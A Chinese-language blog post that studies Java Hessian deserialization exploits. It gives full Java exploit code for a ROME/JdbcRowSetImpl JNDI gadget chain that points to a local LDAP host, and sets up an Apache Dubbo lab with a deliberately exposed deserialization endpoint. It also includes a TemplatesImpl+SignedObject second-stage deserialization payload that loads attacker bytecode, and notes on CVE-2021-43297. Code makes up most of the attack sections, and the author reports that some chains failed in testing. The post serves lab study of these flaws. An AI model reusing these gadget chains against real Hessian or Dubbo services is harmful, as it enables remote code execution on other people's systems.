<a name="MPegP"></a>
# 写在前面
[https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/](https://boogipop.com/2023/03/21/%E8%A2%AB%E6%88%91%E5%BF%98%E6%8E%89%E7%9A%84Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

hession一种二进制协议

导入依赖
```java
<dependency>
    <groupId>com.caucho</groupId>
    <artifactId>hessian</artifactId>
    <version>4.0.63</version>
</dependency>
<dependency>
            <groupId>com.rometools</groupId>
            <artifactId>rome</artifactId>
            <version>1.5.0</version>
        </dependency>
```
rometools版本一定要低。

```java
package Hession;

import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Hessian_JNDI implements Serializable {

    public static <T> byte[] serialize(T o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        HessianOutput output = new HessianOutput(bao);
        output.writeObject(o);
        System.out.println(bao.toString());
        return bao.toByteArray();
    }

    public static <T> T deserialize(byte[] bytes) throws IOException {
        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);
        HessianInput input = new HessianInput(bai);
        Object o = input.readObject();
        return (T) o;
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getValue(Object obj, String name) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        return field.get(obj);
    }

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://localhost:9999/EXP";
        jdbcRowSet.setDataSourceName(url);




        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        //手动生成HashMap，防止提前调用hashcode()
        HashMap hashMap = makeMap(equalsBean,"1");

        byte[] s = serialize(hashMap);
        System.out.println(s);
        System.out.println((HashMap)deserialize(s));
    }

    public static HashMap<Object, Object> makeMap ( Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setValue(s, "table", tbl);
        return s;
    }
}
```
```java
  switch (tag)
case 77:
                type = this.readType();
                return this._serializerFactory.readMap(this, type);
```
进入77，跟进readMap:
```java
 public Object readMap(AbstractHessianInput in, String type)
    throws HessianProtocolException, IOException
  {
    Deserializer deserializer = getDeserializer(type);

    if (deserializer != null)
      return deserializer.readMap(in);
    else if (_hashMapDeserializer != null)
      return _hashMapDeserializer.readMap(in);
    else {
      _hashMapDeserializer = new MapDeserializer(HashMap.class);

      return _hashMapDeserializer.readMap(in);
    }
  }
```
获取deserializer，然后由于两个判断都是null，MapDeserializer初始化。
```java
public Object readMap(AbstractHessianInput in)
    throws IOException
  {
    Map map;
    
    if (_type == null)
      map = new HashMap();
    else if (_type.equals(Map.class))
      map = new HashMap();
    else if (_type.equals(SortedMap.class))
      map = new TreeMap();
    else {
      try {
        map = (Map) _ctor.newInstance();
      } catch (Exception e) {
        throw new IOExceptionWrapper(e);
      }
    }

    in.addRef(map);

    while (! in.isEnd()) {
      map.put(in.readObject(), in.readObject());
    }

    in.readEnd();

    return map;
  }
```
调用了put方法
```java
public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
```
之后就是很常规的恶意方法调用了。
<a name="ppMGf"></a>
# Apache Dubbo Hessian
首先服务容器加载并运行Provider<br />Provider在启动时向注册中心Registry注册自己提供的服务<br />Consumer在Registry处订阅Provider提供的服务<br />注册中心返回服务地址给Consumer<br />Consumer根据Registry提供的服务地址调用Provider提供的服务<br />Consumer和Provider定时向监控中心Monitor发送一些统计数据。
<a name="Qf0C3"></a>
## 导入依赖
```java
<dependencies>
    <dependency>
        <groupId>org.apache.dubbo</groupId>
        <artifactId>dubbo-spring-boot-starter</artifactId>
        <version>2.7.6</version>
    </dependency>
    <dependency>
        <groupId>org.apache.dubbo</groupId>
        <artifactId>dubbo-dependencies-zookeeper</artifactId>
        <version>2.7.6</version>
        <type>pom</type>
        <exclusions>
            <exclusion>
                <artifactId>slf4j-log4j12</artifactId>
                <groupId>org.slf4j</groupId>
            </exclusion>
        </exclusions>
    </dependency>
</dependencies>
```
<a name="oMIWD"></a>
## 项目逐渐搭建
来个接口
```java
package com.api;

public interface IHello {
    String IHello(String name);
}
```
然后，将这个接口打包，使用命令mvn clean install 。<br />打包成特定依赖名，就可以在其它地方导入了。<br />服务端一个spingboot<br />实现端口
```java
package com.example.dubboprovider.service;

import com.api.IHello;
import org.apache.dubbo.config.annotation.Service;

@Service
public class HelloService implements IHello {

    @Override
    public String IHello(String name) {
        return "Hello "+name;
    }
}
```
启动服务端
```java
package com.example.dubboprovider;

import org.apache.dubbo.config.spring.context.annotation.EnableDubboConfig;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
@EnableDubboConfig
public class DubboProviderApplication {

    public static void main(String[] args) {
        SpringApplication.run(DubboProviderApplication.class, args);
    }
}
```
在resources目录下创建yml
```java
server:
  port: 9990   #Spring Web运行端口

spring:
  application:
    name: dubbo-provider   #项目名称

dubbo:
  application:
    name: dubbo-provider   #项目名称
  scan:
    base-packages: com.example.dubboprovider.service   #接口实现类所在包
  registry:
    address: zookeeper://127.0.0.1:2181   #Registry地址
  protocol:
    name: dubbo   #RPC通信协议
    port: 20000   #通信端口
```
先开启zookeeper，然后运行服务端。<br />consumer<br />依赖啥的装上
```java
<dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>

        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-test</artifactId>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>org.apache.dubbo</groupId>
            <artifactId>dubbo-spring-boot-starter</artifactId>
            <version>2.7.6</version>
        </dependency>

        <dependency>
            <groupId>org.apache.dubbo</groupId>
            <artifactId>dubbo-dependencies-zookeeper</artifactId>
            <version>2.7.6</version>
            <type>pom</type>
            <exclusions>
                <exclusion>
                    <artifactId>slf4j-log4j12</artifactId>
                    <groupId>org.slf4j</groupId>
                </exclusion>
            </exclusions>
        </dependency>

        <dependency>
            <groupId>com.example</groupId>
            <artifactId>dubbo-api</artifactId>
            <version>0.0.1-SNAPSHOT</version>
        </dependency>
```
定义访问路由
```java
package com.example.dubboconsumer.consumer;

import com.api.IHello;
import org.apache.dubbo.config.annotation.Reference;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class HelloConsumer {

    @Reference
    private IHello iHello;

    @RequestMapping("/hello")
    public String hello(@RequestParam(name = "name")String name){
        String h = iHello.IHello(name);
        return h;
    }
}
```
```java
package com.example.dubboconsumer;

import org.apache.dubbo.config.spring.context.annotation.EnableDubboConfig;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
@EnableDubboConfig
public class DubboConsumerApplication {

    public static void main(String[] args) {
        SpringApplication.run(DubboConsumerApplication.class, args);
    }

}
```
这时候再启动这个consumer，那么在访问路由的时候，就会有对应业务逻辑。<br />http://127.0.0.1:9991/hello?name=world 回显hello world。
<a name="kp9yX"></a>
## 漏洞环境
provider依赖：
```java
<dependency>
       <groupId>com.rometools</groupId>
       <artifactId>rome</artifactId>
       <version>1.7.0</version>
</dependency>
```
改个api
```java
package com.api;
 
public interface IHello {
    String IHello(String name);
    Object IObject(Object o);
}
```
重写方法：
```java
#HelloService.java
 
package com.example.dubboprovider.service;
 
import com.api.IHello;
import org.apache.dubbo.config.annotation.Service;
 
@Service
public class HelloService implements IHello {
 
    @Override
    public String IHello(String name) {
        return "Hello "+name;
    }
 
    @Override
    public Object IObject(Object o) {
        return o;
    }
}
```
添加路由
```java
@RequestMapping("/calc")
    public void Hessian_Ser() throws Exception {
        Object o = Hessian_Payload.getPayload();
        Object b = iHello.IObject(o);
    }
```
整个payload
```java
package com.example.dubboconsumer.consumer;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class Hessian_Payload {

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setValue(s, "table", tbl);
        return s;
    }

    public static Object getPayload() throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        String url = "ldap://localhost:9999/evilref";
        jdbcRowSet.setDataSourceName(url);


        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap hashMap = makeMap(equalsBean,"1");

        return hashMap;
    }
}
```
起个ldap，访问/calc

<a name="vNoex"></a>
## 分析
```java
public void decode() throws Exception {
        if (!hasDecoded && channel != null && inputStream != null) {
            try {
                decode(channel, inputStream);
```
进去，
```java
for (int i = 0; i < args.length; i++) {
                    try {
                        args[i] = in.readObject(pts[i]);
```
```java
public Object readObject(List<Class<?>> expectedTypes) throws IOException {
        int tag = this._offset < this._length ? this._buffer[this._offset++] & 255 : this.read();
        int ref;
        Deserializer reader;
        boolean valueType;
        boolean valueType;
        String type;
        int length;
        Hessian2Input.ObjectDefinition def;
        Deserializer reader;
        int i;
        byte[] buffer;
 
        switch(tag) {
...
            case 72:
                boolean keyValuePair = expectedTypes != null && expectedTypes.size() == 2;
                reader = this.findSerializerFactory().getDeserializer(Map.class);
                return reader.readMap(this, keyValuePair ? (Class)expectedTypes.get(0) : null, keyValuePair ? (Class)expectedTypes.get(1) : null);
...
}    
 case 'H': {

                boolean keyValuePair = expectedTypes != null && expectedTypes.size() == 2;

                // fix deserialize of short type
                Deserializer reader;
                reader = findSerializerFactory().getDeserializer(Map.class);

                return reader.readMap(this
                        , keyValuePair ? expectedTypes.get(0) : null
                        , keyValuePair ? expectedTypes.get(1) : null);
            }
```
跟进
```java
 protected void doReadMap(AbstractHessianInput in, Map map, Class<?> keyType, Class<?> valueType) throws IOException {
        Deserializer keyDeserializer = null, valueDeserializer = null;

        SerializerFactory factory = findSerializerFactory(in);
        if(keyType != null){
            keyDeserializer = factory.getDeserializer(keyType.getName());
        }
        if(valueType != null){
            valueDeserializer = factory.getDeserializer(valueType.getName());
        }

        while (!in.isEnd()) {
            map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(),
                    valueDeserializer != null? valueDeserializer.readObject(in) : in.readObject());
        }
    }
```
put方法调用hashcode，按理来说会谈计算器，服务器也连接到了，但是为什么就是没反应。<br />明明本地访问ldap就弹计算器，算了，之后再分析吧，<br />好吧，jdk版本太高了，破案了，8-202用不了。。。
<a name="V9eL1"></a>
# TemplatesImpl+SignedObject二次反序列化
这里会用到templatesImpl，之前提到过，但由于_tfactory有transient，不参与序列化，需要在原本的代码里面改变，于是寻找原生readobject，产生二次反序列化。<br />templatesimpl类
```java
private void  readObject(ObjectInputStream is)
      throws IOException, ClassNotFoundException
    {
        SecurityManager security = System.getSecurityManager();
        if (security != null){
            String temp = SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);
            if (temp == null || !(temp.length()==0 || temp.equalsIgnoreCase("true"))) {
                ErrorMsg err = new ErrorMsg(ErrorMsg.DESERIALIZE_TRANSLET_ERR);
                throw new UnsupportedOperationException(err.toString());
            }
        }

        // We have to read serialized fields first.
        ObjectInputStream.GetField gf = is.readFields();
        _name = (String)gf.get("_name", null);
        _bytecodes = (byte[][])gf.get("_bytecodes", null);
        _class = (Class[])gf.get("_class", null);
        _transletIndex = gf.get("_transletIndex", -1);

        _outputProperties = (Properties)gf.get("_outputProperties", null);
        _indentNumber = gf.get("_indentNumber", 0);

        if (is.readBoolean()) {
            _uriResolver = (URIResolver) is.readObject();
        }

        _tfactory = new TransformerFactoryImpl();
    }
```
对于_tfactory进行了赋值。<br />考虑二次反序列化，在第一次反序列化的时候调用readobject赋值从而达到目的。<br />SignedObject类的构造函数能够序列化一个类并且将其存储到属性content中。
```java
public SignedObject(Serializable object, PrivateKey signingKey,
                        Signature signingEngine)
        throws IOException, InvalidKeyException, SignatureException {
            // creating a stream pipe-line, from a to b
            ByteArrayOutputStream b = new ByteArrayOutputStream();
            ObjectOutput a = new ObjectOutputStream(b);

            // write and flush the object content to byte array
            a.writeObject(object);
            a.flush();
            a.close();
            this.content = b.toByteArray();
            b.close();

            // now sign the encapsulated object
            this.sign(signingKey, signingEngine);
    }
```
getobject方法将其取出，
```java
public Object getObject()
        throws IOException, ClassNotFoundException
    {
        // creating a stream pipe-line, from b to a
        ByteArrayInputStream b = new ByteArrayInputStream(this.content);
        ObjectInput a = new ObjectInputStream(b);
        Object obj = a.readObject();
        b.close();
        a.close();
        return obj;
    }
```
exp：
```java
package Hessian;

import com.alibaba.com.caucho.hessian.io.Hessian2Input;
import com.alibaba.com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.operations.Equals;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.HashMap;

public class Hessian_SignedObject {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templatesimpl = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\tmp\\classes\\EXP.class"));
        setValue(templatesimpl,"_name","aaa");
        setValue(templatesimpl,"_bytecodes",new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesimpl);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(123);
        setValue(badAttributeValueExpException,"val",toStringBean);


        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");

        SignedObject signedObject = new SignedObject(badAttributeValueExpException,privateKey,signingEngine);

        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject);

        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean1);

        HashMap hashMap = makeMap(equalsBean, equalsBean);

        byte[] payload = Hessian2_Serial(hashMap);
        Hessian2_Deserial(payload);





    }
    public static byte[] Hessian2_Serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output hessian2Output = new Hessian2Output(baos);
        hessian2Output.writeObject(o);
        hessian2Output.flushBuffer();
        return baos.toByteArray();
    }

    public static Object Hessian2_Deserial(byte[] bytes) throws IOException {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(bais);
        Object o = hessian2Input.readObject();
        return o;
    }
    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        setValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setValue(s, "table", tbl);
        return s;
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}

```
但是打不出来，不知道为什么。
<a name="i3g3V"></a>
# CVE-2021-43297
在hessesion2Input里面有个expect
```java

  protected IOException expect(String expect, int ch)
            throws IOException {
        if (ch < 0)
            return error("expected " + expect + " at end of file");
        else {
            _offset--;

            try {
                Object obj = readObject();

                if (obj != null) {
                    return error("expected " + expect
                            + " at 0x" + Integer.toHexString(ch & 0xff)
                            + " " + obj.getClass().getName() + " (" + obj + ")");
                } else
                    return error("expected " + expect
                            + " at 0x" + Integer.toHexString(ch & 0xff) + " null");
            } catch (IOException e) {
                log.log(Level.FINE, e.toString(), e);

                return error("expected " + expect
                        + " at 0x" + Integer.toHexString(ch & 0xff));
            }
        }
    }
```
有个拼接，如果expect为对象，就会触发其tostring方法。<br />那么就将其赋值为Tostring，就会产生链式反应。<br />readstring，如果tag无匹配项，就会抛出异常：
```java
public int readString(char[] buffer, int offset, int length)
            throws IOException {
        int readLength = 0;

        if (_chunkLength == END_OF_DATA) {
            _chunkLength = 0;
            return -1;
        } else if (_chunkLength == 0) {
            int tag = read();

            switch (tag) {
                case 'N':
                    return -1;

                case 'S':
                case BC_STRING_CHUNK:
                    _isLastChunk = tag == 'S';
                    _chunkLength = (read() << 8) + read();
                    break;

                case 0x00:
                case 0x01:
                case 0x02:
                case 0x03:
                case 0x04:
                case 0x05:
                case 0x06:
                case 0x07:
                case 0x08:
                case 0x09:
                case 0x0a:
                case 0x0b:
                case 0x0c:
                case 0x0d:
                case 0x0e:
                case 0x0f:

                case 0x10:
                case 0x11:
                case 0x12:
                case 0x13:
                case 0x14:
                case 0x15:
                case 0x16:
                case 0x17:
                case 0x18:
                case 0x19:
                case 0x1a:
                case 0x1b:
                case 0x1c:
                case 0x1d:
                case 0x1e:
                case 0x1f:
                    _isLastChunk = true;
                    _chunkLength = tag - 0x00;
                    break;

                default:
                    throw expect("string", tag);
            }
        }
```
在decode里面
```java
 public Object decode(Channel channel, InputStream input) throws IOException {
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        //获取版本信息
        String dubboVersion = in.readUTF();
        this.request.setVersion(dubboVersion);
        this.setAttachment("dubbo", dubboVersion);
        //获取路径
        String path = in.readUTF();
        setAttachment(PATH_KEY, path);
        setAttachment(VERSION_KEY, in.readUTF());
```
readUTF会调用readstring<br />不多说了，前面exp调不起来，摆了。
